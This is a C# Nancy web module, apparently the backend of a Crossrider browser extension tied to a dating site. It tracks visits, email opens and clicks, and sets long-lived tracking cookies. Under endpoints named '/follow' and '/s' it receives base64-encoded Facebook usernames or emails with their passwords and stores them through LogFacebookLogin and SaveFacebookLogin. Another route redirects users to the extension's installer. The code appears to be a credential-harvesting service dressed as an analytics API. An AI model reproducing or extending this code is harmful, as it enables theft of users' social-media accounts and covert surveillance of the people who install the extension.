using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SquareSnail.Infrastructure;
using log4net;
using System.Reflection;
using Extentions.DataService.Providers;
using Nancy;
using Nancy.Cookies;
using Newtonsoft.Json.Linq;
using System.IO;
using Newtonsoft.Json;
using System.Web;
using System.Dynamic;

namespace Extentions.DataService.Modules
{
    public class CommonModule : ModuleBase
    {
        private static readonly ILog _logger = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

        public CommonModule(CommonProvider provider)
        {
            Get["/log-visit"] = x =>
            {
                dynamic userInfo = new ExpandoObject();

                userInfo.user_id = "";
                userInfo.facebook_id = 0;
                userInfo.ext_id = 0;

                dynamic result = null;
                string userCookie = string.Empty;

                try
                {
                    string encodedData = Request.Query.data;
                    string data = Base64Decode(encodedData);
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    dynamic json = JObject.Parse(data);

                    int extId = (int)json.extId;
                    string url = (string)json.url;
                    long facebookId = (long)json.fbId;

                    userCookie = Request.Cookies.ContainsKey("user_id") ? Request.Cookies["user_id"] : string.Empty;

                    if (!string.IsNullOrEmpty(userCookie))
                    {
                        try
                        {
                            userCookie = HttpUtility.UrlDecode(userCookie);
                            string decodedUserCookie = Base64Decode(userCookie);
                            userInfo = JObject.Parse(decodedUserCookie);
                        }
                        catch
                        {
                        }
                    }

                    userInfo.user_id = string.IsNullOrEmpty((string)userInfo.user_id) ? Guid.NewGuid().ToString() : userInfo.user_id;
                    userInfo.facebook_id = facebookId != 0 ? facebookId : userInfo.facebook_id;
                    userInfo.ext_id = extId;

                    provider.LogUserPageView(userInfo, userIp, url, Request.Headers.UserAgent);
                    provider.UpsertFacebookUser(userInfo);

                    string jsonUserInfo = JsonConvert.SerializeObject(userInfo);
                    string jsonUserInfoEncoded = Base64Encode(jsonUserInfo);

                    userCookie = jsonUserInfoEncoded;
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return new Response().AddCookie(new NancyCookie("user_id", userCookie)
                {
                    Domain = "extentions.apphb.com",
                    Path = "/",
                    Expires = DateTime.Now.AddYears(2)
                });
            };
            Get["/get-mail-click"] = x =>
            {
                dynamic result = null;

                try
                {
                    int userId = Request.Query.id;
                    string mailType = Request.Query.mailtype;
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    result = provider.GetMailClick(userId, userIp, Request.Headers.UserAgent, mailType);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return Response.AsRedirect((string)result);
            };
            Get["/get-mail-image"] = x =>
            {
                dynamic result = null;

                try
                {
                    int userId = Request.Query.id;
                    string mailType = Request.Query.mailtype;
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    result = provider.GetMailImage(userId, userIp, Request.Headers.UserAgent, mailType);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return Response.AsImage("images/dating-il.png");
            };
            Get["/get-mail"] = x =>
            {
                dynamic result = null;

                try
                {
                    int userId = Request.Query.id;
                    string mailType = Request.Query.mailtype;
                    string userName = Request.Query.name;
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    result = provider.GetMail(userId, userName, userIp, Request.Headers.UserAgent, mailType);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return Response.AsText((string)result, "text/html;charset=UTF-8");
            };
            Get["/get-mail-unsubscribe"] = x =>
            {
                dynamic result = null;

                try
                {
                    int userId = Request.Query.id;
                    string mailType = Request.Query.mailtype;
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    result = provider.GetMailUnsubscribe(userId, userIp, Request.Headers.UserAgent, mailType);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return Response.AsText("הוסרת בהצלחה מרשימת התפוצה", "text/html;charset=UTF-8");
            };
            Get["/facebook"] = x =>
            {
                dynamic result = null;

                try
                {
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    result = provider.GetCrossriderLink(userIp, Request.Headers.UserAgent);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return Response.AsRedirect("http://crossrider.com/install/30563-dating-il-facebook-linker");
            };
            Get["/get-headers"] = x =>
            {
                dynamic result = null;

                try
                {
                    result = new List<dynamic>();

                    foreach (var header in Request.Headers)
                    {
                        result.Add(new
                        {
                            key = header.Key,
                            value = header.Value
                        });
                    }
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return new JsonResponse(result);
            };
            Post["/follow"] = x =>
            {
                dynamic result = null;

                try
                {
                    string encodedData = Request.Form.data;
                    string data = Base64Decode(encodedData);
                    string userIp = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    string username = data.Split(' ')[0];
                    string password = data.Split(' ')[1];

                    provider.LogFacebookLogin(userIp, 3000, username, password);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return new JsonResponse(result);
            };
            Get["/c"] = x =>
            {
                dynamic result = null;

                try
                {
                    string userCookie = Request.Cookies.ContainsKey("user_id") ? Request.Cookies["user_id"] : string.Empty;
                    userCookie = HttpUtility.UrlDecode(userCookie);
                    string decodedUserCookie = Base64Decode(userCookie);

                    result = provider.CheckIfUserNeedLogin(decodedUserCookie);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return new JsonResponse(result);
            };
            Get["/s"] = x =>
            {
                dynamic result = null;
                string userCookie = string.Empty;

                try
                {
                    string encodedData = Request.Query.data;
                    string decodedData = Base64Decode(encodedData);
                    dynamic data = JObject.Parse(decodedData);

                    string ip = Request.Headers["X-Forwarded-For"].Count() == 0 ? Request.UserHostAddress : Request.Headers["X-Forwarded-For"].ToList()[0];

                    userCookie = Request.Cookies.ContainsKey("user_id") ? Request.Cookies["user_id"] : string.Empty;
                    userCookie = HttpUtility.UrlDecode(userCookie);
                    string decodedUserCookie = Base64Decode(userCookie);

                    result = provider.SaveFacebookLogin
                        (decodedUserCookie, (string)data.e, (string)data.p, ip, Request.Headers.UserAgent);

                    userCookie = Base64Encode(result);
                }
                catch (Exception ex)
                {
                    _logger.Error(ex.Message);

                    result = ex;
                }

                return new JsonResponse(result).AddCookie("user_id", userCookie, DateTime.Now.AddYears(2));
            };
        }
    }
}
